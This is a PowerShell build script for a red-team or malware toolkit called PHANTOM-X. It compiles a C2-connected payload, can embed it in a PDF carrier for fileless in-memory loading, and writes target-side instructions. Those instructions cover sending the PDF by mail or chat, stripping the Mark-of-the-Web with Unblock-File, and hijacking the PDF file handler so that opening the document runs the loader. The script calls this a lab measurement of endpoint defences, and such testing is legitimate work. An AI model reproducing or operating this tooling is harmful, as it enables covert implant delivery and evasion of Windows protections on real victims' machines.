#Requires -Version 5.1
<#
.SYNOPSIS
    PHANTOM-X :: build the bundle that goes to the target machine.

.DESCRIPTION
    Assembles the small set of files that have to be copied to the
    Windows machine, with the C2 address already compiled in.

    WHAT ACTUALLY GOES TO THE TARGET

        px_payload_all.exe      the payload. One file. Standalone.

    That is the whole of it for the operator's side. The C2 server
    stays on the HOST -- it is the thing being connected TO, so sending
    it to the target would be sending the target a copy of its own
    attacker.

    The optional chain files add the fileless delivery path:

        px_loader.exe          extracts the payload from the PDF and maps
                               it in memory
        px_attack_chain.pdf    the carrier. The payload is INSIDE it.

    With the chain, the only file that has to arrive by any means at
    all is the PDF: the loader pulls the payload out of it in memory,
    so the payload never touches the target's disk.

    WHAT DOES NOT GO TO THE TARGET

        px_c2.exe              the C2 server. Host only.
        px_detect.exe          the rule generator. Host only.
        px_pdfscan.exe         the PDF scanner. Host only.

.PARAMETER C2Host
    The address of the C2 server, compiled into the payload.

.PARAMETER C2Port
    The port of the C2 server.

.PARAMETER Arm
    Which variant arm to ship. "all" is the one for the operator: every
    capability except domain generation, which would replace the host
    with a generated name and could not be pointed at an address.

.PARAMETER IncludeChain
    Also put the loader and the carrier PDF in the bundle.

.PARAMETER Carrier
    Build the PDF carrier: the payload embedded in a PDF, with the loader
    beside it.

    The carrier is the lab's DELIVERY PATH. The PDF carries the payload
    as an embedded file; the loader extracts it and maps it in memory, so
    the payload never touches the disk on the target.

    The question the carrier exists to answer is whether the chain
    survives the trip: a PDF that arrives over the internet carries the
    Mark-of-the-Web, which is a different file to the endpoint than one
    that arrived from a shared folder. The bundle's instructions say
    how to handle that.

.PARAMETER OutputDir
    Where the bundle goes.

.EXAMPLE
    .\make_target_bundle.ps1 -C2Host 192.168.77.1 -C2Port 9001 -Arm all

.EXAMPLE
    .\make_target_bundle.ps1 -C2Host 192.168.77.1 -Arm all -Carrier
#>
[CmdletBinding()]
param(
    [string]$C2Host = '127.0.0.1',
    [int]$C2Port = 9001,
    [string]$Arm = 'all',
    [switch]$IncludeChain,
    [switch]$Carrier,
    [string]$OutputDir = ''
)

$ErrorActionPreference = 'Continue'
$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent

if (-not $OutputDir) {
    $OutputDir = Join-Path $root "dist\phantom-x-target-$Arm"
}
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# The bundle is rebuilt from scratch every time.
#
# A stale file left over from an earlier run is worse than no file: the
# carrier PDF from last run points at last run's C2, and the operator
# sends it believing it points at this one's.
Get-ChildItem $OutputDir -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notin @('manifest.json', 'START-HERE.txt') } |
    Remove-Item -Force -ErrorAction SilentlyContinue

Write-Host ''
Write-Host ('=' * 70) -ForegroundColor DarkGray
Write-Host 'PHANTOM-X :: TARGET BUNDLE' -ForegroundColor Cyan
Write-Host ('=' * 70) -ForegroundColor DarkGray
Write-Host "  C2 address : $C2Host`:$C2Port" -ForegroundColor White
Write-Host "  arm        : $Arm" -ForegroundColor White
Write-Host "  output     : $OutputDir" -ForegroundColor White
Write-Host ''

# ---------------------------------------------------------------------------
# Build the arm, with the address compiled in
#
# The whole matrix is built -- that is what build_variants.ps1 does --
# but only the ONE arm that was asked for is put in the bundle. A target
# folder with thirteen binaries in it is a target folder that somebody
# will run the wrong one out of.
# ---------------------------------------------------------------------------
$staging = Join-Path $env:TEMP ("px-target-build-" + [guid]::NewGuid().ToString('N').Substring(0, 8))

Push-Location $here
try {
    Write-Host '  building the arms (only one of them is kept) ...' -ForegroundColor Gray
    & powershell.exe -NoProfile -ExecutionPolicy Bypass `
        -File (Join-Path $here 'build_variants.ps1') `
        -C2Host $C2Host -C2Port $C2Port -OutputDir $staging `
        2>&1 | Where-Object { $_ -match "OK   $Arm |FAIL|error" } |
        ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

    $built = Join-Path $staging "px_payload_$Arm.exe"
    if (-not (Test-Path $built)) {
        Write-Host "[!] the arm did not build: $built" -ForegroundColor Red
        Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue
        exit 1
    }
    Copy-Item $built (Join-Path $OutputDir "px_payload_$Arm.exe") -Force
} finally {
    Pop-Location
    Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
# The optional chain files
# ---------------------------------------------------------------------------
$chainFiles = @()
if ($IncludeChain -or $Carrier) {
    $native = Join-Path $root 'dist\native'
    foreach ($n in @('px_loader.exe')) {
        $src = Join-Path $native $n
        if (Test-Path $src) {
            Copy-Item $src $OutputDir -Force
            $chainFiles += $n
        } else {
            Write-Host "[!] missing from dist\native: $n" -ForegroundColor Yellow
        }
    }
}

# ---------------------------------------------------------------------------
# The PDF carrier
#
# The payload goes INSIDE the PDF as an embedded file. The loader pulls
# it out and maps it in memory, so the payload never lands on the disk of
# the machine that opens the PDF.
#
# The PDF is built from the payload that was compiled for THIS bundle, so
# it points at the same C2 address the loose binary would.
# ---------------------------------------------------------------------------
if ($Carrier) {
    $payloadExe = Join-Path $OutputDir "px_payload_$Arm.exe"
    $pdfOut = Join-Path $OutputDir "px_carrier.pdf"
    $makePdf = Join-Path $root 'phase1_pdf\make_attack_pdf.py'

    if (-not (Test-Path $makePdf)) {
        Write-Host "[!] make_attack_pdf.py not found; no carrier built" -ForegroundColor Red
    } else {
        $python = Get-Command python.exe -ErrorAction SilentlyContinue
        if (-not $python) { $python = Get-Command python3.exe -ErrorAction SilentlyContinue }
        if (-not $python) {
            Write-Host '[!] no Python; no carrier built' -ForegroundColor Yellow
        } else {
            & $python.Source $makePdf --payload $payloadExe --out $pdfOut `
                --name "px_payload_$Arm.exe" 2>&1 |
                Where-Object { $_ -match 'wrote|error|Error' } |
                ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
            if (Test-Path $pdfOut) {
                $chainFiles += 'px_carrier.pdf'
                Write-Host ("    carrier : {0} bytes" -f (Get-Item $pdfOut).Length) -ForegroundColor Green
            } else {
                Write-Host '[!] the carrier PDF was not built' -ForegroundColor Red
            }
        }
    }
}

# ---------------------------------------------------------------------------
# The instructions
# ---------------------------------------------------------------------------
$lines = @()
$lines += '================================================================================'
$lines += "PHANTOM-X :: TARGET SIDE -- $Arm arm"
$lines += '================================================================================'
$lines += ''
$lines += "    The C2 address is already compiled in: $C2Host`:$C2Port"
$lines += '    There is nothing to configure and no environment variable to set.'
$lines += ''
$lines += ''
$lines += 'STEP 1 -- START THE PAYLOAD'
$lines += ''
$lines += '    Open a PowerShell window in this folder and run:'
$lines += ''
$lines += "        .\px_payload_$Arm.exe"
$lines += ''
$lines += '    It will print its own log, and it will keep retrying until the C2'
$lines += '    server is reachable. That is deliberate: the server can be started'
$lines += '    before or after the payload, in any order.'
$lines += ''
$lines += '    To stop it, use the C2 console:  kill 1'
$lines += ''
if ($chainFiles.Count -gt 0) {
    $lines += ''
    $lines += 'STEP 2 (OPTIONAL) -- THE FILELESS DELIVERY PATH'
    $lines += ''
    $lines += '    This bundle also carries the PDF chain, where the payload never'
    $lines += '    touches the disk: the loader extracts it from the PDF and maps'
    $lines += '    it in memory.'
    $lines += ''
    $lines += '        .\px_loader.exe .\px_carrier.pdf'
    $lines += ''
    $lines += '    The loader writes a log beside itself: loader.log'
    $lines += ''
}
if ($Carrier) {
    $lines += ''
    $lines += 'STEP 3 (OPTIONAL) -- THE CARRIER OVER A NETWORK HOP'
    $lines += ''
    $lines += '    px_carrier.pdf can be sent to the machine as a document: by'
    $lines += '    mail, by a chat client, through a file share, or any other way'
    $lines += '    a file travels. The payload is inside it.'
    $lines += ''
    $lines += '    TWO THINGS HAPPEN TO A FILE THAT ARRIVES THAT WAY, AND BOTH'
    $lines += '    OF THEM ARE PART OF THE MEASUREMENT:'
    $lines += ''
    $lines += '      1. It gets the MARK-OF-THE-WEB. Windows treats a file'
    $lines += '         from the internet differently from one that came from a'
    $lines += '         shared folder. That is the point of the mark, and the'
    $lines += '         lab measures what it costs.'
    $lines += ''
    $lines += '      2. It gets SmartScreen. A PDF that has never been seen'
    $lines += '         is a reputation question, and the PDF carrier is a'
    $lines += '         document with an executable in it.'
    $lines += ''
    $lines += '    On the receiving machine, in an elevated PowerShell:'
    $lines += ''
    $lines += '        Unblock-File .\px_carrier.pdf'
    $lines += ''
    $lines += '    That is the Mark-of-the-Web being taken off deliberately. It'
    $lines += '    is also the difference between the two measurements, and'
    $lines += '    the lab records which one it took.'
    $lines += ''
    $lines += '    The loader still has to be on the machine. To make double-'
    $lines += '    clicking the PDF run the loader:'
    $lines += ''
    $lines += '        .\install_pdf_handler.ps1 -LoaderPath .\px_loader.exe'
    $lines += ''
    $lines += '    And then the PDF is opened the way any document is:'
    $lines += ''
    $lines += '        .\px_carrier.pdf'
    $lines += ''
}
$lines += ''
$lines += 'WHAT IS NOT IN THIS BUNDLE, AND WHY'
$lines += ''
$lines += '    px_c2.exe       the C2 server. It is the thing being connected TO.'
$lines += '                    It stays on the host.'
$lines += '    px_detect.exe   the detection rule generator. Host only.'
$lines += '    px_pdfscan.exe  the PDF scanner. Host only.'
$lines += ''
$lines += 'REMOVING IT'
$lines += ''
$lines += '    The payload writes a marker file and a log next to itself. Delete'
$lines += '    the .exe and those two files and the machine is as it was.'
$lines += '    The capabilities that change the machine remove their own changes'
$lines += '    and print the removal command in their report.'
$lines += ''
$lines += '================================================================================'

$readme = Join-Path $OutputDir 'START-HERE.txt'
$lines | Set-Content -Path $readme -Encoding utf8

# ---------------------------------------------------------------------------
# The manifest
# ---------------------------------------------------------------------------
$files = Get-ChildItem $OutputDir -File | Where-Object { $_.Extension -eq '.exe' -or $_.Extension -eq '.pdf' }
$manifest = @()
foreach ($f in $files) {
    $hash = (Get-FileHash $f.FullName -Algorithm SHA256).Hash
    $manifest += [ordered]@{
        file   = $f.Name
        bytes  = $f.Length
        sha256 = $hash.ToLower()
    }
}
$manifest | ConvertTo-Json -Depth 3 |
    Set-Content -Path (Join-Path $OutputDir 'manifest.json') -Encoding utf8

Write-Host ''
Write-Host '  THE BUNDLE' -ForegroundColor White
Get-ChildItem $OutputDir -File | Sort-Object Name | ForEach-Object {
    Write-Host ("    {0,-34} {1,9} bytes" -f $_.Name, $_.Length)
}
Write-Host ''
Write-Host "  -> $OutputDir" -ForegroundColor Green
Write-Host ''

# ---------------------------------------------------------------------------
# Zip it, so it is one file to move
# ---------------------------------------------------------------------------
$zip = "$OutputDir.zip"
try {
    if (Test-Path $zip) { Remove-Item $zip -Force }
    Compress-Archive -Path (Join-Path $OutputDir '*') -DestinationPath $zip -Force
    $zsum = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
    "$zsum  $(Split-Path $OutputDir -Leaf).zip" |
        Set-Content -Path "$zip.sha256" -Encoding ascii
    Write-Host ("    {0,-34} {1,9} bytes" -f (Split-Path $zip -Leaf), (Get-Item $zip).Length)
    $zipName = Split-Path $zip -Leaf
    $shortSum = $zsum.Substring(0, 16) + '...'
    Write-Host ("    {0,-34} {1}" -f ($zipName + '.sha256'), $shortSum)
} catch {
    Write-Host "    (could not create the zip: $($_.Exception.Message))" -ForegroundColor Yellow
}

Write-Host ''
Write-Host '  Copy this folder -- or the zip -- to the target machine.' -ForegroundColor White
Write-Host '  Nothing else is needed.' -ForegroundColor White
Write-Host ''
exit 0
